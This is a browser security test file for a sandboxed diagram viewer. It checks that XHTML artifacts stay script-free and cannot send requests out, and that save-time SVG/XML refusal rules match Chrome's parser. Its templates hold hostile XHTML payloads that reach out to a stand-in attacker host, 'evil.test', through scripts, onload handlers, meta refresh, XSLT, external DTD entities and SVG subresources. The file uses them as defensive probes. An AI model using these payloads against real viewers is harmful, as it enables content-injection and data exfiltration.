// Queue item 24, live: a diagram's XHTML index in the REAL viewer's sandboxed
// frame, served by the REAL artifact-origin handler, in a private headless
// Chrome (tests/fixtures/headless-chrome.mjs). Fake hostnames map to one
// loopback server with --host-resolver-rules:
//   dash.test — the trusted viewer page (viewerCsp + viewer.js)
//   art.test  — the artifact origin
//   evil.test — an attacker; every request it receives is recorded
//   ctl.test  — the UNPROTECTED control: the same bytes and content type, no
//               CSP, no sandbox, so a probe only counts where it is live
// Proves: the XHTML frame keeps the sealed guarantees (empty sandbox
// attribute, the diagram CSP with `sandbox`, nosniff, no script, no egress);
// the SVG really is parsed as XML into the SVG namespace; real renderer
// output parses cleanly; and every save-time XML rule matches a real Chrome
// parse error (no rule refuses what the browser would show).
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { readFileSync } from "node:fs";
import { startHeadlessChrome } from "./fixtures/headless-chrome.mjs";
import { createArtifactOriginHandler } from "../servers/gateway/artifact-origin/server.js";
import { createViewTokenStore } from "../servers/gateway/artifact-origin/view-tokens.js";
import { frameGrantFor, viewerCsp, cspFor } from "../servers/gateway/artifact-origin/policy.js";
import { renderVersion, xmlSvg } from "../bundles/artifacts/server/render.js";

const VIEWER_JS = readFileSync(new URL("../bundles/artifacts/panel/static/viewer.js", import.meta.url), "utf8");
const CORPUS = JSON.parse(readFileSync(new URL("./fixtures/rendered-svg-corpus.json", import.meta.url), "utf8")).items;
const XHTML = "application/xhtml+xml; charset=utf-8";
const SVG_NS = "http://www.w3.org/2000/svg";

let chrome, server, P, tokens, origin;
const evil = [];
const served = [];   // { url, status, headers } for every art.test response
const CONTENT = new Map();
const CTL = [];   // { body, contentType } served top-level on ctl.test with NO CSP and NO sandbox

before(async () => {
  tokens = createViewTokenStore();
  const resolveContent = async ({ artifactId, path }) => (CONTENT.get(artifactId) || {})[path] || null;
  server = http.createServer((req, res) => {
    const host = String(req.headers.host || "").split(":")[0];
    if (host === "evil.test") {
      evil.push(req.url);
      if (req.url.startsWith("/xslt")) {
        res.writeHead(200, { "content-type": "text/xsl", "access-control-allow-origin": "*" });
        return res.end(`<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><html xmlns="http://www.w3.org/1999/xhtml"><body><img src="http://evil.test:${P}/xslt-out"/></body></html></xsl:template></xsl:stylesheet>`);
      }
      res.writeHead(200, { "content-type": req.url.startsWith("/x.dtd") ? "application/xml-dtd" : "text/plain", "access-control-allow-origin": "*" });
      return res.end(req.url.startsWith("/x.dtd") ? '<!ENTITY d "dtd-loaded">' : "x");
    }
    if (host === "art.test") {
      // The served headers, recorded in-process (no dependence on CDP event timing).
      const wh = res.writeHead.bind(res);
      res.writeHead = (st, h) => { served.push({ url: req.url, status: st, headers: { ...h } }); return wh(st, h); };
      return origin(req, res);
    }
    if (host === "ctl.test" && req.url.startsWith("/doc?i=")) {
      const d = CTL[Number(new URL(req.url, "http://x").searchParams.get("i"))];
      res.writeHead(d ? 200 : 404, { "content-type": d ? d.contentType : "text/plain" });
      return res.end(d ? d.body : "");
    }
    if (host === "dash.test") {
      if (req.url === "/viewer.js") { res.writeHead(200, { "content-type": "text/javascript" }); return res.end(VIEWER_JS); }
      if (req.url.startsWith("/harness")) {
        res.writeHead(200, { "content-type": "text/html", "content-security-policy": viewerCsp(`http://art.test:${P}`) });
        return res.end(`<!doctype html><body style="margin:0"><div id=c style="width:800px;height:600px"></div>
<script src="/viewer.js"></script><script>
window.__r = { trips: [], ready: 0, raw: [], refused: [] };
addEventListener("message", (e) => window.__r.raw.push(e.data));
window.__mountWith = (g) => { window.__v = CrowArtifactViewer.mount({ container: c, mint: () => g,
  onTrip: (x) => __r.trips.push(x), onReady: () => __r.ready++, onRefuse: (x) => __r.refused.push(x) }); return __v.load().then(() => true, (e) => e.message); };
</script></body>`);
      }
    }
    res.writeHead(404); res.end();
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  P = server.address().port;
  origin = createArtifactOriginHandler({ tokens, resolveContent, publicBase: null, fallbackBase: `http://art.test:${P}` });
  chrome = await startHeadlessChrome({ extraArgs: ["--host-resolver-rules=MAP dash.test 127.0.0.1, MAP art.test 127.0.0.1, MAP evil.test 127.0.0.1, MAP ctl.test 127.0.0.1"] });
});
after(async () => { server?.closeAllConnections?.(); server?.close(); if (chrome) await chrome.close(); });

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function waitFor(fn, ms = 10000) { const end = Date.now() + ms; while (Date.now() < end) { let v; try { v = await fn(); } catch {} if (v) return v; await sleep(80); } return null; }

/** A CDP tab that auto-attaches to out-of-process frames (the artifact frame
 *  is cross-site, so it is its own target) and records Network events. */
async function tab() {
  const t = await (await fetch(chrome.cdp + "/json/new?about:blank", { method: "PUT" })).json();
  const { default: WebSocket } = await import("ws");
  const ws = new WebSocket(t.webSocketDebuggerUrl);
  await new Promise((r, j) => { ws.once("open", r); ws.once("error", j); });
  let id = 0;
  const events = [];
  const frames = new Map();   // sessionId -> url
  const send = (method, params = {}, sessionId) => new Promise((resolve, reject) => {
    const mine = ++id;
    const on = (raw) => { const m = JSON.parse(raw); if (m.id !== mine) return; ws.off("message", on); m.error ? reject(new Error(JSON.stringify(m.error))) : resolve(m.result || {}); };
    ws.on("message", on); ws.send(JSON.stringify({ id: mine, method, params, ...(sessionId ? { sessionId } : {}) }));
  });
  ws.on("message", (raw) => {
    const m = JSON.parse(raw);
    if (m.method === "Target.attachedToTarget") {
      const sid = m.params.sessionId;
      frames.set(sid, m.params.targetInfo.url);
      send("Network.enable", {}, sid).catch(() => {});
      send("Runtime.runIfWaitingForDebugger", {}, sid).catch(() => {});
    } else if (m.method === "Target.targetInfoChanged" || m.method === "Target.detachedFromTarget") {
      if (m.method === "Target.detachedFromTarget") frames.delete(m.params.sessionId);
    } else if (m.method && m.method.startsWith("Network.")) events.push(m);
  });
  await send("Page.enable"); await send("Network.enable");
  await send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: true, flatten: true });
  const evalIn = async (expression) => { const o = await send("Runtime.evaluate", { expression, returnByValue: true, awaitPromise: true }); return o.exceptionDetails ? { threw: o.exceptionDetails.text } : o.result.value; };
  // Asserts the navigation committed (code review): a failed or timed-out
  // navigation must never let a check pass on the previous page. (A page may
  // then navigate itself, e.g. the control's meta refresh.)
  const nav = async (url) => {
    const r = await send("Page.navigate", { url });
    assert.ok(!r.errorText, `navigated to ${url}: ${r.errorText || ""}`);
    assert.ok(await waitFor(async () => (await evalIn("document.readyState")) === "complete"), `loaded ${url}`);
  };
  /** The artifact frame's DOM, read through the DOM domain (no script runs in
   *  the frame: it has none). An in-process frame is reached through the
   *  iframe's contentDocument (pierce); an out-of-process one through its own
   *  attached target. Flattened to [{name, local, isSVG, xml}]. */
  const flatten = (root) => {
    const out = [];
    const walk = (n) => { out.push({ name: n.nodeName, local: n.localName, isSVG: !!n.isSVG, xml: n.xmlVersion || null }); (n.children || []).forEach(walk); };
    walk(root);
    return out;
  };
  const frameDom = async () => {
    const { root } = await send("DOM.getDocument", { depth: -1, pierce: true });
    let frame = null;
    const find = (n) => { if (frame) return; if (n.localName === "iframe" && (n.attributes || []).some((a, i, arr) => i % 2 === 0 && a === "class" && arr[i + 1] === "crow-artifact-frame")) { frame = n; return; } (n.children || []).forEach(find); };
    find(root);
    if (frame && frame.contentDocument) return flatten(frame.contentDocument);
    for (const [sid] of frames) {
      try { return flatten((await send("DOM.getDocument", { depth: -1 }, sid)).root); } catch { /* not this one */ }
    }
    return null;
  };
  return { send, evalIn, nav, events, frameDom, close: async () => { ws.close(); await fetch(chrome.cdp + "/json/close/" + t.id).catch(() => {}); } };
}

let seq = 0;
function grantFor(type, files) {
  const artifactId = "art-" + (++seq);
  CONTENT.set(artifactId, files);
  const { token, tokenId, nonce } = tokens.mint({ artifactId, versionN: 1, type, dashboardOrigin: `http://dash.test:${P}` });
  const fg = frameGrantFor(type, false);
  return { url: `http://art.test:${P}/v/${token}/`, token, tokenId, nonce, sandbox: fg.sandbox, scripted: fg.speaks, type };
}
const filesOf = (r) => Object.fromEntries(r.files.map((f) => [f.path, { body: f.body, contentType: f.contentType }]));

async function mountIn(t, g) {
  await t.nav(`http://dash.test:${P}/harness`);
  assert.equal(await t.evalIn(`__mountWith(${JSON.stringify(g)})`), true, "the viewer mounted the grant");
  assert.ok(await waitFor(() => t.evalIn("__r.ready")), "the frame loaded (script-free frames are ready on load)");
}
/** Index response headers seen by the browser for this grant. */
function indexResponse(events, g) {
  const req = events.find((e) => e.method === "Network.requestWillBeSent" && e.params.request.url === g.url);
  if (!req) return null;
  const res = events.find((e) => e.method === "Network.responseReceived" && e.params.requestId === req.params.requestId);
  return res ? Object.fromEntries(Object.entries(res.params.response.headers).map(([k, v]) => [k.toLowerCase(), v])) : null;
}
const parseErrorIn = (dom) => dom.some((n) => n.local === "parsererror" || n.name.toLowerCase() === "parsererror");

test("a saved diagram in the viewer's sandboxed frame: XHTML under the sealed diagram CSP, parsed into the SVG namespace, no parse error, no trip", async (ctx) => {
  if (!chrome) return ctx.skip("no headless Chrome");
  const svg = '<svg viewBox="0 0 200 100"><defs><linearGradient id="g"><stop offset="0" stop-color="#e2a03f"/></linearGradient><rect id="r0" width="10" height="10"/></defs>'
    + '<style><![CDATA[ g > rect { stroke: #333 } ]]></style><g id="n1"><title>Node &amp; one</title><rect width="120" height="60" fill="url(#g)"/></g><use xlink:href="#r0" x="150"/><text x="10" y="90">a &lt; b</text></svg>';
  const r = await renderVersion("diagram", { svg });
  const g = grantFor("diagram", filesOf(r));
  const t = await tab();
  try {
    const before = evil.length;
    await mountIn(t, g);
    await sleep(300);
    const attrs = await t.evalIn(`(() => { const f = document.querySelector('iframe.crow-artifact-frame'); return f && { sandbox: f.getAttribute('sandbox'), rp: f.getAttribute('referrerpolicy'), allow: f.getAttribute('allow') }; })()`);
    assert.deepEqual(attrs, { sandbox: "", rp: "no-referrer", allow: "" }, "the frame carries the empty sandbox attribute");
    const h = indexResponse(t.events, g);
    assert.ok(h, "the browser loaded the index");
    assert.equal(h["content-type"], XHTML);
    assert.equal(h["x-content-type-options"], "nosniff");
    assert.equal(h["content-security-policy"], cspFor("diagram", { tokenBase: g.url, frameAncestors: `http://dash.test:${P}` }));
    assert.match(h["content-security-policy"], /; sandbox$/);
    assert.doesNotMatch(h["content-security-policy"], /script-src/);
    const dom = await waitFor(async () => { const d = await t.frameDom(); return d && d.some((n) => n.local === "svg") ? d : null; }, 5000);
    assert.ok(dom, "the artifact frame's DOM is readable over CDP");
    assert.ok(dom.some((n) => n.xml), "the frame's document is an XML document (the XML parser ran)");
    assert.equal(parseErrorIn(dom), false, "no parse error");
    const svgs = dom.filter((n) => n.local === "svg");
    assert.equal(svgs.length, 1);
    assert.equal(svgs[0].isSVG, true, "<svg> is an SVG element");
    assert.ok(dom.some((n) => n.local === "linearGradient"), "case-sensitive names survive as written");
    // The served headers, recorded in the origin itself.
    const sv = served.filter((x) => g.url.endsWith(x.url));
    assert.equal(sv.length, 1, "the index was served once");
    assert.equal(sv[0].headers["content-type"], XHTML);
    assert.equal(sv[0].headers["x-content-type-options"], "nosniff");
    assert.equal(sv[0].headers["content-security-policy"], h["content-security-policy"]);
    assert.equal(sv[0].headers["access-control-allow-origin"], undefined);
    // The frame runs as an opaque origin (the CSP sandbox with no flags).
    const tree = await t.send("Page.getFrameTree");
    const child = (tree.frameTree.childFrames || []).map((c) => c.frame).find((f) => f.url.startsWith(`http://art.test:${P}/v/`));
    assert.ok(child, "the artifact frame is in the frame tree");
    assert.equal(child.mimeType, "application/xhtml+xml");
    // CDP's frame tree names the precursor origin even for a sandboxed frame,
    // so ask the frame itself, from a DevTools isolated world.
    const world = await t.send("Page.createIsolatedWorld", { frameId: child.id, worldName: "xhtml-probe" });
    const o = await t.send("Runtime.evaluate", { expression: "JSON.stringify({ origin: self.origin, xml: document.xmlVersion, ct: document.contentType, ns: document.documentElement.namespaceURI })", contextId: world.executionContextId, returnByValue: true });
    console.log(`[diagram-xhtml] in-frame: ${o.result && o.result.value}`);
    const inFrame = JSON.parse(o.result.value);
    assert.equal(inFrame.origin, "null", "the frame runs as an opaque origin");
    assert.equal(inFrame.ct, "application/xhtml+xml");
    assert.equal(inFrame.ns, "http://www.w3.org/1999/xhtml");
    assert.ok(dom.filter((n) => n.local === "rect").every((n) => n.isSVG));
    const st = await t.evalIn("__v.state()");
    assert.deepEqual({ tripped: st.tripped, loads: st.loads }, { tripped: false, loads: 1 });
    assert.deepEqual(evil.slice(before), []);
  } finally { await t.close(); }
});

test("real renderer output (mermaid, d2, vega-lite) parses cleanly as XHTML in the sandboxed frame", async (ctx) => {
  if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    for (const item of CORPUS) {
      const design = { kit: async () => ({ themes: new Map(), resolve: () => ({ files: [], refs: [], entries: [] }), render: async () => item.svg }) };
      const r = await renderVersion("diagram", { engine: item.engine, source: item.source }, { design });
      const g = grantFor("diagram", filesOf(r));
      await mountIn(t, g);
      const dom = await waitFor(async () => { const d = await t.frameDom(); return d && d.some((n) => n.local === "svg") ? d : null; }, 5000);
      assert.ok(dom, `${item.engine}: frame DOM readable`);
      assert.equal(parseErrorIn(dom), false, `${item.engine}: no parse error`);
      assert.equal(dom.find((n) => n.local === "svg").isSVG, true, `${item.engine}: SVG namespace`);
      assert.ok(dom.some((n) => n.xml), `${item.engine}: an XML document`);
      const st = await t.evalIn("__v.state()");
      assert.deepEqual({ tripped: st.tripped, loads: st.loads }, { tripped: false, loads: 1 }, item.engine);
    }
  } finally { await t.close(); }
});

// Hostile XHTML served AS a diagram (not something the renderer can produce:
// this is the origin's guarantee on its own, whatever the stored bytes). Each
// prolog channel (XSLT, a CSS stylesheet PI, external DTD/entities) is its
// own document: a stylesheet or entity that fails can blank the whole
// document and hide every other probe.
const XHTML_HEAD = '<html xmlns="http://www.w3.org/1999/xhtml" xmlns:xi="http://www.w3.org/2001/XInclude">';
function hostileXhtml(E) {
  return `<!DOCTYPE html>${XHTML_HEAD}<head><meta http-equiv="refresh" content="0;url=${E}/meta"/>
<link rel="stylesheet" href="${E}/css"/><style>body{background:url(${E}/bg)}</style></head><body>
<script>window.__ran = 1; fetch("${E}/script"); parent.postMessage({ t: "probe-result" }, "*");</script>
<img src="${E}/img"/><iframe src="${E}/frame"></iframe><object data="${E}/object"></object>
<svg xmlns="${SVG_NS}" xmlns:xlink="http://www.w3.org/1999/xlink" onload="fetch('${E}/onload')"><script>fetch("${E}/svgscript")</script>
<style>@import url(${E}/import); @font-face { font-family: z; src: url(${E}/font) } text { font-family: z }</style><text>z</text>
<image href="${E}/svgimage" width="1" height="1"/><filter id="f"><feImage href="${E}/feimage"/></filter><rect width="2" height="2" filter="url(#f)"/>
<use href="${E}/use#x"/><g xml:base="${E}/base/"><image href="rel.png" width="1" height="1"/></g>
<a id="lnk" xlink:href="#"><animate attributeName="href" to="${E}/animate" begin="0s" fill="freeze"/><set attributeName="href" to="${E}/set" begin="0s"/><rect width="3" height="3"/></a>
</svg><xi:include href="${E}/xinclude"/>
</body></html>`;
}
const xsltXhtml = (E) => `<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="${E}/xslt"?>
${XHTML_HEAD}<body><svg xmlns="${SVG_NS}"><rect width="1" height="1"/></svg></body></html>`;
const cssPiXhtml = (E) => `<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/css" href="${E}/csspi"?>
${XHTML_HEAD}<body><svg xmlns="${SVG_NS}"><rect width="1" height="1"/></svg></body></html>`;
const dtdXhtml = (E) => `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html SYSTEM "${E}/x.dtd" [<!ENTITY e SYSTEM "${E}/entity">]>
${XHTML_HEAD}<body><p>&e;</p><svg xmlns="${SVG_NS}"><rect width="1" height="1"/></svg></body></html>`;

// The core probes MUST be live in the unprotected control (a floor, so the
// test can never pass vacuously on a mis-served control). The others are
// counted where live and logged where this engine has no such channel.
const CORE_LIVE = ["/script", "/svgscript", "/onload", "/meta", "/img", "/frame", "/object", "/bg", "/css"];
for (const [label, make, mustBeLive] of [
  ["scripts, handlers, meta refresh, subresources and SVG channels", hostileXhtml, CORE_LIVE],
  ["an xml-stylesheet (XSLT) processing instruction", xsltXhtml, []],
  ["an xml-stylesheet (CSS) processing instruction", cssPiXhtml, []],
  ["an external DTD and an external entity", dtdXhtml, []],
]) {
  test(`hostile XHTML served as a diagram — ${label}: nothing runs or leaves, each probe counted only where the unprotected control proves it live`, async (ctx) => {
    if (!chrome) return ctx.skip("no headless Chrome");
    const E = `http://evil.test:${P}`;
    const body = make(E);
    const t = await tab();
    try {
      // The control: same bytes, same content type, top-level on ctl.test, no CSP, no sandbox.
      CTL.push({ body, contentType: XHTML });
      const b0 = evil.length;
      await t.nav(`http://ctl.test:${P}/doc?i=${CTL.length - 1}`);
      const liveNow = () => [...new Set(evil.slice(b0).map((p) => p.split("?")[0].replace(/#.*$/, "")))].sort();
      // Wait for the floor (no fixed sleep: full-suite load), then a grace period for the rest.
      await waitFor(() => mustBeLive.every((m) => liveNow().includes(m)), 15000);
      await sleep(1000);
      const live = liveNow();
      console.log(`[diagram-xhtml] ${label}: live in the unprotected control: ${live.join(" ") || "(none: this engine has no such channel)"}`);
      for (const m of mustBeLive) assert.ok(live.includes(m), `the control is live for ${m} (got ${live.join(", ")})`);
      const before = evil.length;
      const g = grantFor("diagram", { "index.html": { body: Buffer.from(body), contentType: XHTML } });
      await mountIn(t, g);
      await sleep(1500);
      assert.deepEqual(evil.slice(before), [], "nothing reached evil.test from the sandboxed XHTML frame");
      assert.equal(await t.evalIn(`__r.raw.some(m => m && m.t === "probe-result")`), false, "no script ran");
      const st = await t.evalIn("__v.state()");
      assert.deepEqual({ tripped: st.tripped, loads: st.loads }, { tripped: false, loads: 1 }, "no navigation (meta refresh refused)");
    } finally { await t.close(); }
  });
}

test("a malformed XHTML body (Chrome's parse-error page) still runs nothing and sends nothing", async (ctx) => {
  if (!chrome) return ctx.skip("no headless Chrome");
  const E = `http://evil.test:${P}`;
  const body = `<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><body><script>fetch("${E}/before-error")</script><img src="${E}/img2"/><p>unclosed</body></html>`;
  const t = await tab();
  try {
    CTL.push({ body, contentType: XHTML });
    const b0 = evil.length;
    await t.nav(`http://ctl.test:${P}/doc?i=${CTL.length - 1}`);
    await sleep(800);
    assert.equal(await t.evalIn(`document.getElementsByTagNameNS("*", "parsererror").length > 0`), true, "the control shows a parse error");
    assert.ok(evil.slice(b0).includes("/before-error"), "the control is live: content before the error runs unprotected");
    const before = evil.length;
    const g = grantFor("diagram", { "index.html": { body: Buffer.from(body), contentType: XHTML } });
    await mountIn(t, g);
    await sleep(800);
    assert.deepEqual(evil.slice(before), []);
    const st = await t.evalIn("__v.state()");
    assert.deepEqual({ tripped: st.tripped, loads: st.loads }, { tripped: false, loads: 1 }, "a parse-error page is one load: never a second-load trip that would flag the version");
  } finally { await t.close(); }
});

// Each save-time XML rule against a real Chrome parse (plan review I3/I4:
// Chrome is the oracle, not xmldom). The SVG is wrapped the way the renderer
// would wrap it WITHOUT xmlSvg (namespaces added by hand when missing), then
// loaded top-level as XHTML. Two lists, both directions asserted:
//  - XML-required: Chrome must show a parse error;
//  - policy: Chrome parses it, and xmlSvg refuses it on purpose (namespace
//    switches, an xml:base alias, names in a case the XML parser does not
//    fix up — those render WRONG with no error, which is why they are refused).
// A lone surrogate is not here: UTF-8 bytes cannot carry one.
const REFUSED_PARSE_ERRORS = [
  "<svg><linearGradient id=\"g\"></lineargradient></svg>",
  "<svg><text>a &AMP; b</text></svg>",
  "<svg><text>&#X41;</text></svg>",
  "<svg><text>&#0;</text></svg>",
  "<svg><text>&#xD800;</text></svg>",
  "<svg><text>&#x110000;</text></svg>",
  "<svg><text>&nbsp;</text></svg>",
  "<svg\fviewBox=\"0 0 1 1\"><g/></svg>",
  "<svg><text>a\u0001b</text></svg>",
  "<svg><text>a\uFFFEb</text></svg>",
  "<svg><text>a ]]> b</text></svg>",
  '<svg><rect width="1" width="2"/></svg>',
  '<svg xmlns:l="http://www.w3.org/1999/xlink"><use xlink:href="#a" l:href="#b"/></svg>',
  '<svg><g foo:bar="1"/></svg>',
  '<svg xmlns:a="urn:x"><g a:b:c="1"/></svg>',
  '<svg xmlns:a="urn:x"><g a:="1"/></svg>',
  '<svg xmlns:xml="urn:x"><g/></svg>',
  '<svg xmlns:xmlns="urn:x"><g/></svg>',
  '<svg xmlns:a=""><g/></svg>',
  // An xml:base alias through a prefix bound to the XML namespace (Chrome 156 refuses it too).
  '<svg xmlns:p="http://www.w3.org/XML/1998/namespace"><g p:base="http://e.example/"/></svg>',
];
const REFUSED_POLICY = [
  ['<svg><g xmlns="http://www.w3.org/1999/xhtml"><style>p{}</style></g></svg>', "true"],
  ['<svg><g xmlns:a="urn:x" a:b="1"/></svg>', "true"],
  ['<svg xmlns:ink="http://www.inkscape.org/namespaces/inkscape"><g ink:label="x"/></svg>', "true"],
  // Parses, but is not a gradient: the HTML parser fixed the case, the XML parser does not.
  ['<svg><lineargradient id="g"/></svg>', `!(document.getElementById("g") instanceof SVGLinearGradientElement)`],
  ['<svg viewbox="0 0 1 1"><g/></svg>', `document.getElementsByTagNameNS("${SVG_NS}", "svg")[0].viewBox.baseVal === null || document.getElementsByTagNameNS("${SVG_NS}", "svg")[0].getAttribute("viewBox") === null`],
  ['<svg><rect Fill="red"/></svg>', "true"],
];
const ACCEPTED = [
  '<svg><style><![CDATA[ g > rect { fill: red } ]]></style><rect/></svg>',
  "<svg><text>a &lt; b &gt; c &quot;d&quot; &apos;e&apos; &#160; &#xA0; &#x1F600;</text></svg>",
  "<svg viewBox='0 0 1 1'><g\tid='a'\r\n/></svg>",
  "<svg><text>a ]] b ] > c</text></svg>",
  '<svg xml:space="preserve"><text xml:lang="es">a</text></svg>',
  '<svg><use xlink:href="#a"/></svg>',
  '<svg viewBox="0 0 1 1" preserveAspectRatio="none"><linearGradient id="g" gradientUnits="userSpaceOnUse"/><filter id="f"><feGaussianBlur stdDeviation="1"/></filter><clipPath id="c" clipPathUnits="objectBoundingBox"/></svg>',
];
const handWrap = (svg) => {
  let s = svg;
  // What the renderer would add, done by hand so the refused rule is the ONLY defect.
  if (!/^<svg[^>]*\sxmlns=/.test(s)) s = s.replace(/^<svg/, `<svg xmlns="${SVG_NS}"`);
  if (s.includes("xlink:") && !/xmlns:xlink=/.test(s)) s = s.replace(/^<svg/, '<svg xmlns:xlink="http://www.w3.org/1999/xlink"');
  return `<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><meta charset="utf-8"/></head><body>${s}</body></html>`;
};

test("differential: every save-time XML refusal is a real Chrome parse error, and every accepted tricky case parses", async (ctx) => {
  if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const parsesInChrome = async (svg) => {
      CTL.push({ body: Buffer.from(handWrap(svg)), contentType: XHTML });
      const url = `http://ctl.test:${P}/doc?i=${CTL.length - 1}`;
      await t.nav(url);
      assert.equal(await t.evalIn("location.href"), url, "the oracle reads the page it just loaded");
      return t.evalIn(`document.getElementsByTagNameNS("*", "parsererror").length === 0 && document.getElementsByTagNameNS("${SVG_NS}", "svg").length === 1`);
    };
    for (const svg of REFUSED_PARSE_ERRORS) {
      assert.equal(xmlSvg(svg), null, `refused at save: ${JSON.stringify(svg)}`);
      assert.equal(await parsesInChrome(svg), false, `Chrome also refuses: ${JSON.stringify(svg)}`);
    }
    for (const [svg, check] of REFUSED_POLICY) {
      assert.equal(xmlSvg(svg), null, `refused at save (policy): ${JSON.stringify(svg)}`);
      assert.equal(await parsesInChrome(svg), true, `but Chrome parses it: ${JSON.stringify(svg)}`);
      assert.equal(await t.evalIn(check), true, `and the reason holds in Chrome: ${JSON.stringify(svg)}`);
    }
    for (const svg of ACCEPTED) {
      assert.ok(xmlSvg(svg), `accepted at save: ${JSON.stringify(svg)}`);
      assert.equal(await parsesInChrome(svg), true, `Chrome parses it: ${JSON.stringify(svg)}`);
      // And the renderer's own wrapper (with xmlSvg's namespaces) parses too.
      const r = await renderVersion("diagram", { svg });
      const f = r.files.find((x) => x.path === "index.html");
      CTL.push({ body: f.body, contentType: f.contentType });
      await t.nav(`http://ctl.test:${P}/doc?i=${CTL.length - 1}`);
      assert.equal(await t.evalIn(`document.getElementsByTagNameNS("*", "parsererror").length === 0 && document.getElementsByTagNameNS("${SVG_NS}", "svg").length === 1`), true, `renderer wrapper parses: ${JSON.stringify(svg)}`);
    }
  } finally { await t.close(); }
});
